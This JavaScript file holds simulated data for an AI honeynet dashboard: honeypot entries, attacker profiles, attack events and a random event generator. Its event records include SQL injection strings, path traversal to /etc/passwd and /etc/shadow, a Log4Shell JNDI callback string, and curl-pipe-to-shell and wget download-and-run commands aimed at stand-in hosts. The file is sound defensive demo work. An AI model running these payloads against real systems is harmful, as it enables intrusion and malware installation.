/**
 * Central Mock Data Repository for AI-Based Intelligent Honeynet
 *
 * IMPORTANT NOTE:
 * All IP addresses used here are reserved for documentation purposes
 * (RFC 5737: 192.0.2.0/24 TEST-NET-1, 198.51.100.0/24 TEST-NET-2, 203.0.113.0/24 TEST-NET-3).
 * This data is simulated demo data to demonstrate the dashboard's capabilities.
 */

export const INITIAL_HONEYPOTS = [
  {
    id: 'hp-cowrie',
    name: 'Cowrie SSH Honeypot',
    service: 'SSH / Telnet Emulation',
    container: 'honeynet-cowrie-1',
    port: 2222,
    internalIp: '172.20.0.10',
    status: 'active', // active, degraded, offline
    riskLevel: 'high',
    eventCount: 412,
    uniqueAttackers: 14,
    lastActivity: '2 mins ago',
    description: 'Medium interaction SSH & Telnet decoy logging brute force, uploaded binaries & terminal session commands.',
    decoyType: 'Medium Interaction',
    dockerImage: 'cowrie/cowrie:latest',
    uptime: '18h 42m'
  },
  {
    id: 'hp-web',
    name: 'Fake Web Server',
    service: 'HTTP / Nginx Decoy',
    container: 'honeynet-fake-web-1',
    port: 8080,
    internalIp: '172.20.0.11',
    status: 'active',
    riskLevel: 'critical',
    eventCount: 846,
    uniqueAttackers: 28,
    lastActivity: 'Just now',
    description: 'Emulated vulnerable web portal (WordPress & PHPMyAdmin decoys) trapping SQLi, Path Traversal, and CVE probes.',
    decoyType: 'Low Interaction',
    dockerImage: 'honeynet/web-decoy:v1.2',
    uptime: '22h 10m'
  },
  {
    id: 'hp-db',
    name: 'Fake Database Service',
    service: 'MySQL / Redis Honeypot',
    container: 'honeynet-fake-db-1',
    port: 3306,
    internalIp: '172.20.0.12',
    status: 'active',
    riskLevel: 'medium',
    eventCount: 189,
    uniqueAttackers: 9,
    lastActivity: '14 mins ago',
    description: 'Decoy SQL/NoSQL port trapping database credential brute forcing, unauthorized dump attempts & exploit vectors.',
    decoyType: 'Low Interaction',
    dockerImage: 'honeynet/mysql-decoy:latest',
    uptime: '15h 05m'
  },
  {
    id: 'hp-ai-engine',
    name: 'AI Analysis Engine',
    service: 'Neural Threat Classifier',
    container: 'honeynet-ai-engine-core',
    port: 5000,
    internalIp: '172.20.0.2',
    status: 'active',
    riskLevel: 'safe',
    eventCount: 1447, // events analyzed
    uniqueAttackers: 32,
    lastActivity: 'Active streaming',
    description: 'Log ingestion pipeline applying behavioral clustering, risk scoring, and MITRE ATT&CK tactic classification.',
    decoyType: 'SOC Analytics Core',
    dockerImage: 'honeynet/ai-threat-analyzer:v2.4',
    uptime: '24h 00m'
  }
];

export const INITIAL_ATTACKERS = [
  {
    ip: '192.0.2.45',
    label: 'Kali Linux (Simulated Attacker 1)',
    origin: 'Reserved Demo Subnet (TEST-NET-1)',
    firstSeen: '2026-10-20 09:12:14',
    lastSeen: '2026-10-20 13:38:52',
    totalEvents: 342,
    mostTargetedService: 'Fake Web Server',
    mostFrequentAttackType: 'SQL Injection',
    riskScore: 94,
    status: 'Active Scanning',
    reputation: 'Malicious Scanner',
    osFingerprint: 'Linux 5.x / Kali 2024.x (Nmap signature)',
    toolsDetected: ['sqlmap/1.7#stable', 'nikto/2.1.6', 'Nmap 7.94'],
    tacticsUsed: ['Initial Access', 'Credential Access', 'Defense Evasion']
  },
  {
    ip: '198.51.100.18',
    label: 'Automated Botnet Crawler',
    origin: 'Reserved Demo Subnet (TEST-NET-2)',
    firstSeen: '2026-10-20 06:40:02',
    lastSeen: '2026-10-20 13:25:10',
    totalEvents: 418,
    mostTargetedService: 'Cowrie SSH Honeypot',
    mostFrequentAttackType: 'SSH Brute Force',
    riskScore: 88,
    status: 'Persistent Brute-Force',
    reputation: 'Mirai-Variant Decoy Bot',
    osFingerprint: 'Embedded Linux / BusyBox',
    toolsDetected: ['Paramiko/2.11', 'Hydra v9.5', 'ssh-scan-script'],
    tacticsUsed: ['Credential Access', 'Execution']
  },
  {
    ip: '203.0.113.88',
    label: 'Recon & CVE Probe Host',
    origin: 'Reserved Demo Subnet (TEST-NET-3)',
    firstSeen: '2026-10-20 11:05:30',
    lastSeen: '2026-10-20 13:41:00',
    totalEvents: 195,
    mostTargetedService: 'Fake Web Server',
    mostFrequentAttackType: 'Directory Traversal',
    riskScore: 79,
    status: 'Reconnaissance',
    reputation: 'Vulnerability Scanner',
    osFingerprint: 'Linux 6.x (Metasploit Decoy)',
    toolsDetected: ['curl/7.88', 'Gobuster/3.5', 'ffuf/2.0'],
    tacticsUsed: ['Reconnaissance', 'Discovery']
  },
  {
    ip: '192.0.2.112',
    label: 'Database Prober',
    origin: 'Reserved Demo Subnet (TEST-NET-1)',
    firstSeen: '2026-10-20 08:30:11',
    lastSeen: '2026-10-20 12:49:15',
    totalEvents: 114,
    mostTargetedService: 'Fake Database Service',
    mostFrequentAttackType: 'DB Brute Force',
    riskScore: 68,
    status: 'Idle',
    reputation: 'Credential Sprayer',
    osFingerprint: 'Python-urllib / Medusa probe',
    toolsDetected: ['pymysql-scanner', 'Medusa v2.2'],
    tacticsUsed: ['Credential Access']
  },
  {
    ip: '198.51.100.95',
    label: 'Multi-port Recon Scanner',
    origin: 'Reserved Demo Subnet (TEST-NET-2)',
    firstSeen: '2026-10-20 12:15:00',
    lastSeen: '2026-10-20 13:42:30',
    totalEvents: 378,
    mostTargetedService: 'All Honeypots (Sweep)',
    mostFrequentAttackType: 'SYN Port Sweep',
    riskScore: 72,
    status: 'Active Scanning',
    reputation: 'Masscan Sweep Engine',
    osFingerprint: 'Masscan / ZMap Decoy',
    toolsDetected: ['masscan/1.3.2', 'zmap 2.1'],
    tacticsUsed: ['Reconnaissance']
  }
];

export const INITIAL_EVENTS = [
  {
    id: 'EVT-9042',
    timestamp: '2026-10-20 13:42:15',
    sourceIp: '192.0.2.45',
    destinationService: 'Fake Web Server',
    destinationPort: 8080,
    attackType: 'SQL Injection',
    usernameAttempted: 'admin\' OR \'1\'=\'1',
    severity: 'Critical',
    riskScore: 94,
    mitreTactic: 'T1190 - Exploit Public-Facing Application',
    eventDetails: 'Classic tautology SQL injection payload injected into query parameter `/?id=1\' OR \'1\'=\'1 --` aimed at extracting user accounts.',
    sessionActions: [
      { step: 1, time: '13:41:50', action: 'Port Scan SYN received on port 8080' },
      { step: 2, time: '13:42:01', action: 'HTTP GET /login.php returned 200 OK decoy page' },
      { step: 3, time: '13:42:08', action: 'HTTP POST /login with payload: admin\' OR 1=1--' },
      { step: 4, time: '13:42:15', action: 'AI Model triggered: High certainty SQL injection attempt' }
    ],
    aiAnalysis: {
      classification: 'Exploitation Attempt - SQL Injection',
      confidence: 0.96,
      reasoning: 'Payload pattern matches OWASP SQLi vector targeting authentication bypass. Signature matched tautological clause with comment delimiter.',
      indicators: [
        'Quote character stripping detected',
        'Tautology condition pattern "1=1" recognized',
        'SQL comment syntax "--" suffix present',
        'Payload targeted credential database'
      ],
      recommendedActions: [
        'Keep IP trapped in high-latency decoy honeynet tarpit',
        'Feed artificial delayed SQL error responses to map attacker fingerprint',
        'Export payload telemetry to SIEM blacklist',
        'Update WAF regex rule 942100'
      ]
    }
  },
  {
    id: 'EVT-9041',
    timestamp: '2026-10-20 13:41:00',
    sourceIp: '198.51.100.18',
    destinationService: 'Cowrie SSH Honeypot',
    destinationPort: 2222,
    attackType: 'SSH Brute Force',
    usernameAttempted: 'root:password123',
    severity: 'High',
    riskScore: 88,
    mitreTactic: 'T1110.001 - Password Guessing',
    eventDetails: 'Automated rapid dictionary attack against SSH service. 47 distinct password attempts detected within a 60-second window.',
    sessionActions: [
      { step: 1, time: '13:40:02', action: 'SSH-2.0-OpenSSH_8.4p1 handshake initiated' },
      { step: 2, time: '13:40:15', action: 'Attempted login: root / 123456 (Rejected)' },
      { step: 3, time: '13:40:32', action: 'Attempted login: admin / admin2024 (Rejected)' },
      { step: 4, time: '13:41:00', action: 'Attempted login: root / password123 (Emulated decoy session opened)' }
    ],
    aiAnalysis: {
      classification: 'Credential Access - SSH Dictionary Attack',
      confidence: 0.94,
      reasoning: 'Inter-arrival timing under 1.2s per credential pair indicates automated tool (Hydra or Medusa).',
      indicators: [
        'Rapid auth failures (>40 req/min)',
        'Common wordlist sequence observed',
        'Client banner identified as automated script wrapper'
      ],
      recommendedActions: [
        'Engage Cowrie session recorder to capture follow-up shell commands',
        'Isolate decoy shell environment to prevent any lateral pivot',
        'Log hash of any downloaded wget/curl payloads'
      ]
    }
  },
  {
    id: 'EVT-9040',
    timestamp: '2026-10-20 13:39:48',
    sourceIp: '203.0.113.88',
    destinationService: 'Fake Web Server',
    destinationPort: 8080,
    attackType: 'Directory Traversal',
    usernameAttempted: 'N/A',
    severity: 'High',
    riskScore: 82,
    mitreTactic: 'T1083 - File and Directory Discovery',
    eventDetails: 'Path traversal query `GET /static/../../../../etc/passwd` attempting to exfiltrate host system configuration and accounts.',
    sessionActions: [
      { step: 1, time: '13:38:50', action: 'Fuzzing directories with ffuf scanner' },
      { step: 2, time: '13:39:12', action: 'Probing static asset paths' },
      { step: 3, time: '13:39:48', action: 'Directory traversal sequence injected' }
    ],
    aiAnalysis: {
      classification: 'Initial Discovery - Path Traversal',
      confidence: 0.92,
      reasoning: 'Dot-dot-slash sequence in URL parameter aimed at breaking out of web root sandbox.',
      indicators: [
        'Traversal characters `../` repeated 4+ times',
        'Targeted sensitive Unix file `/etc/passwd`',
        'User agent indicates automated fuzzer'
      ],
      recommendedActions: [
        'Serve sanitized synthetic honeypot /etc/passwd decoy file with canary accounts',
        'Track any attempts to log in with synthetic canary credentials'
      ]
    }
  },
  {
    id: 'EVT-9039',
    timestamp: '2026-10-20 13:37:12',
    sourceIp: '198.51.100.95',
    destinationService: 'Fake Web Server',
    destinationPort: 80,
    attackType: 'SYN Port Sweep',
    usernameAttempted: 'N/A',
    severity: 'Medium',
    riskScore: 65,
    mitreTactic: 'T1046 - Network Service Discovery',
    eventDetails: 'Stealth SYN probe scanned ports 21, 22, 23, 80, 443, 3306, and 8080 across all decoy network containers.',
    sessionActions: [
      { step: 1, time: '13:36:55', action: 'Half-open SYN probe sent to TCP 21' },
      { step: 2, time: '13:37:01', action: 'Half-open SYN probe sent to TCP 22' },
      { step: 3, time: '13:37:12', action: 'Mass SYN burst across port 8080' }
    ],
    aiAnalysis: {
      classification: 'Reconnaissance - Port Sweep',
      confidence: 0.89,
      reasoning: 'SYN packets with no ACK completion matching Masscan or Nmap -sS stealth scan pattern.',
      indicators: [
        'Incomplete 3-way TCP handshakes',
        'Sequential/randomized port targeting',
        'Scan rate > 100 packets/sec'
      ],
      recommendedActions: [
        'Present open decoy responses for all ports to confuse reconnaissance footprint',
        'Calculate adversary timing profile'
      ]
    }
  },
  {
    id: 'EVT-9038',
    timestamp: '2026-10-20 13:34:05',
    sourceIp: '192.0.2.112',
    destinationService: 'Fake Database Service',
    destinationPort: 3306,
    attackType: 'DB Brute Force',
    usernameAttempted: 'root:mysql',
    severity: 'Medium',
    riskScore: 71,
    mitreTactic: 'T1110 - Brute Force',
    eventDetails: 'MySQL handshake authentication attempts using common default database credentials (`root`, `dba`, `test`, `mysql`).',
    sessionActions: [
      { step: 1, time: '13:33:40', action: 'MySQL client protocol handshake' },
      { step: 2, time: '13:33:51', action: 'Auth packet: user="root" pass="root"' },
      { step: 3, time: '13:34:05', action: 'Auth packet: user="root" pass="mysql"' }
    ],
    aiAnalysis: {
      classification: 'Credential Access - Database Auth Probing',
      confidence: 0.91,
      reasoning: 'Direct TCP connection to port 3306 attempting classic privileged database administrative logins.',
      indicators: [
        'Common default database administrative user accounts',
        'No prior TLS negotiation',
        'Short session lifespans'
      ],
      recommendedActions: [
        'Return fake successful connection with fabricated empty tables',
        'Log attacker dump queries for threat intelligence'
      ]
    }
  },
  {
    id: 'EVT-9037',
    timestamp: '2026-10-20 13:30:20',
    sourceIp: '192.0.2.45',
    destinationService: 'Cowrie SSH Honeypot',
    destinationPort: 2222,
    attackType: 'Command Injection',
    usernameAttempted: 'guest',
    severity: 'Critical',
    riskScore: 97,
    mitreTactic: 'T1059.004 - Unix Shell Execution',
    eventDetails: 'Observed shell commands executing `curl -s http://malware.decoy/bot.sh | sh; uname -a; cat /proc/cpuinfo` in decoy terminal.',
    sessionActions: [
      { step: 1, time: '13:29:45', action: 'Decoy shell session spawned' },
      { step: 2, time: '13:29:55', action: 'Command entered: uname -a' },
      { step: 3, time: '13:30:08', action: 'Command entered: cat /proc/cpuinfo' },
      { step: 4, time: '13:30:20', action: 'Malicious dropper pipe: curl ... | sh' }
    ],
    aiAnalysis: {
      classification: 'Execution & Defense Evasion - Remote Dropper Execution',
      confidence: 0.99,
      reasoning: 'Staged pipeline execution piping remote HTTP payload directly into standard shell interpreter, characteristic of botnet droppers.',
      indicators: [
        'Pipe to shell interpreter pattern `| sh`',
        'Host reconnaissance commands executed in immediate succession',
        'Outbound retrieval to unverified domain attempted'
      ],
      recommendedActions: [
        'Capture sha256 hash of simulated payload',
        'Simulate execution failure with benign error code to observe secondary fallback',
        'Quarantine IP at perimeter firewall'
      ]
    }
  },
  {
    id: 'EVT-9036',
    timestamp: '2026-10-20 13:22:18',
    sourceIp: '198.51.100.18',
    destinationService: 'Fake Web Server',
    destinationPort: 8080,
    attackType: 'CVE Exploit Probe',
    usernameAttempted: 'N/A',
    severity: 'High',
    riskScore: 85,
    mitreTactic: 'T1190 - Exploit Public-Facing Application',
    eventDetails: 'Targeted probe for Spring4Shell / Log4Shell signature matching `${jndi:ldap://198.51.100.18:1389/Exploit}` in User-Agent header.',
    sessionActions: [
      { step: 1, time: '13:22:00', action: 'HTTP GET /api/v1/health' },
      { step: 2, time: '13:22:18', action: 'Crafted User-Agent with JNDI string payload' }
    ],
    aiAnalysis: {
      classification: 'Exploitation for RCE - JNDI / Log4j Vector',
      confidence: 0.98,
      reasoning: 'String matches known CVE-2021-44228 remote code execution payload in header field.',
      indicators: [
        'JNDI lookup prefix syntax detected',
        'Targeted LDAP callback port 1389',
        'Attempted unauthenticated RCE trigger'
      ],
      recommendedActions: [
        'Return HTTP 500 error decoy to trick attacker scanner',
        'Log remote callback IP for botnet attribution'
      ]
    }
  },
  {
    id: 'EVT-9035',
    timestamp: '2026-10-20 13:14:40',
    sourceIp: '203.0.113.88',
    destinationService: 'Cowrie SSH Honeypot',
    destinationPort: 2222,
    attackType: 'SSH Brute Force',
    usernameAttempted: 'support:support2025',
    severity: 'Low',
    riskScore: 42,
    mitreTactic: 'T1110 - Brute Force',
    eventDetails: 'Isolated login probe with low frequency. Single attempt rejected by decoy SSH authentication module.',
    sessionActions: [
      { step: 1, time: '13:14:38', action: 'SSH client banner received' },
      { step: 2, time: '13:14:40', action: 'Login failed: support / support2025' }
    ],
    aiAnalysis: {
      classification: 'Initial Access - Isolated Credential Probe',
      confidence: 0.78,
      reasoning: 'Single password guess without persistent burst. Likely low-rate background scan.',
      indicators: [
        'Single attempt with no immediate follow-up',
        'Standard SSH client signature'
      ],
      recommendedActions: [
        'Add to low-priority monitoring buffer',
        'No immediate mitigation required'
      ]
    }
  }
];

export const HOURLY_ATTACK_ACTIVITY = [
  { time: '08:00', totalEvents: 42, critical: 4, high: 12, medium: 18, low: 8 },
  { time: '09:00', totalEvents: 85, critical: 9, high: 24, medium: 36, low: 16 },
  { time: '10:00', totalEvents: 140, critical: 18, high: 45, medium: 52, low: 25 },
  { time: '11:00', totalEvents: 210, critical: 28, high: 68, medium: 84, low: 30 },
  { time: '12:00', totalEvents: 320, critical: 42, high: 104, medium: 128, low: 46 },
  { time: '13:00', totalEvents: 447, critical: 64, high: 152, medium: 165, low: 66 },
  { time: 'Current', totalEvents: 203, critical: 32, high: 71, medium: 72, low: 28 }
];

export const ATTACK_TYPE_DISTRIBUTION = [
  { name: 'SSH Brute Force', count: 520, fill: '#3b82f6', percentage: 36 },
  { name: 'SQL Injection', count: 345, fill: '#ef4444', percentage: 24 },
  { name: 'Port Sweeping', count: 260, fill: '#f59e0b', percentage: 18 },
  { name: 'Directory Traversal', count: 180, fill: '#8b5cf6', percentage: 12 },
  { name: 'Command Injection / Droppers', count: 142, fill: '#ec4899', percentage: 10 }
];

export const SEVERITY_DISTRIBUTION = [
  { name: 'Critical (80-100)', count: 197, fill: '#ef4444', color: 'text-red-400', bg: 'bg-red-500/10', border: 'border-red-500/30' },
  { name: 'High (60-79)', count: 476, fill: '#f97316', color: 'text-orange-400', bg: 'bg-orange-500/10', border: 'border-orange-500/30' },
  { name: 'Medium (40-59)', count: 555, fill: '#eab308', color: 'text-amber-400', bg: 'bg-amber-500/10', border: 'border-amber-500/30' },
  { name: 'Low (0-39)', count: 219, fill: '#10b981', color: 'text-emerald-400', bg: 'bg-emerald-500/10', border: 'border-emerald-500/30' }
];

// Generator for new realistic simulated events when Demo Mode is actively streaming
export function generateSimulatedEvent() {
  const sources = [
    { ip: '192.0.2.45', os: 'Kali Linux 2024.x' },
    { ip: '198.51.100.18', os: 'Mirai Decoy Botnet' },
    { ip: '203.0.113.88', os: 'Nmap Fuzzer Host' },
    { ip: '192.0.2.112', os: 'Python Medusa Probe' },
    { ip: '198.51.100.95', os: 'Masscan Engine' }
  ];

  const types = [
    {
      type: 'SQL Injection',
      service: 'Fake Web Server',
      port: 8080,
      severity: 'Critical',
      score: Math.floor(Math.random() * 10) + 90,
      tactic: 'T1190 - Exploit Public-Facing Application',
      user: "user' UNION SELECT 1, @@version, user() --",
      details: 'Payload injected into HTTP query parameter targeting backend database structure.'
    },
    {
      type: 'SSH Brute Force',
      service: 'Cowrie SSH Honeypot',
      port: 2222,
      severity: 'High',
      score: Math.floor(Math.random() * 15) + 75,
      tactic: 'T1110.001 - Password Guessing',
      user: `admin:${['pass123', 'toor', 'supersecret', 'honeypot'][Math.floor(Math.random() * 4)]}`,
      details: 'Automated rapid credential attempt intercepted by Cowrie SSH emulator.'
    },
    {
      type: 'Command Injection',
      service: 'Cowrie SSH Honeypot',
      port: 2222,
      severity: 'Critical',
      score: Math.floor(Math.random() * 6) + 94,
      tactic: 'T1059.004 - Shell Command Execution',
      user: 'root',
      details: 'Adversary typed remote download command: wget http://192.0.2.200/miner.elf -O /tmp/x && chmod +x /tmp/x'
    },
    {
      type: 'SYN Port Sweep',
      service: 'Fake Web Server',
      port: 80,
      severity: 'Medium',
      score: Math.floor(Math.random() * 20) + 50,
      tactic: 'T1046 - Network Service Scanning',
      user: 'N/A',
      details: 'Rapid TCP SYN flag probes swept across Docker exposed container ports.'
    },
    {
      type: 'Directory Traversal',
      service: 'Fake Web Server',
      port: 8080,
      severity: 'High',
      score: Math.floor(Math.random() * 12) + 78,
      tactic: 'T1083 - File Discovery',
      user: 'N/A',
      details: 'GET request with directory traversal encoding `..%2f..%2fetc/shadow`.'
    },
    {
      type: 'DB Brute Force',
      service: 'Fake Database Service',
      port: 3306,
      severity: 'Medium',
      score: Math.floor(Math.random() * 15) + 60,
      tactic: 'T1110 - Brute Force',
      user: 'mysql_admin:admin',
      details: 'Unauthorized MySQL handshake auth packet with default credentials.'
    }
  ];

  const source = sources[Math.floor(Math.random() * sources.length)];
  const attack = types[Math.floor(Math.random() * types.length)];
  const date = new Date();
  const timeStr = date.toTimeString().split(' ')[0];
  const dateStr = date.toISOString().split('T')[0];

  return {
    id: `EVT-${Math.floor(Math.random() * 9000) + 1000}`,
    timestamp: `${dateStr} ${timeStr}`,
    sourceIp: source.ip,
    destinationService: attack.service,
    destinationPort: attack.port,
    attackType: attack.type,
    usernameAttempted: attack.user,
    severity: attack.severity,
    riskScore: attack.score,
    mitreTactic: attack.tactic,
    eventDetails: attack.details,
    sessionActions: [
      { step: 1, time: timeStr, action: `Inbound connection from ${source.ip} to port ${attack.port}` },
      { step: 2, time: timeStr, action: `Payload delivered: ${attack.details.substring(0, 45)}...` },
      { step: 3, time: timeStr, action: `AI Engine scored threat at ${attack.score}/100 [${attack.severity}]` }
    ],
    aiAnalysis: {
      classification: `${attack.severity} Threat - ${attack.type}`,
      confidence: +(0.85 + Math.random() * 0.14).toFixed(2),
      reasoning: `Rule-based AI heuristic matched payload signature with high anomaly divergence on ${attack.service}.`,
      indicators: [
        `Source IP ${source.ip} actively probed decoy port ${attack.port}`,
        `Payload matches MITRE ${attack.tactic}`,
        'High anomalous request frequency over short duration'
      ],
      recommendedActions: [
        'Maintain honeynet deception state to prolong attacker engagement',
        'Mirror traffic to Deep Packet Inspection pipeline',
        'Log threat signature to SIEM rulebase'
      ]
    }
  };
}
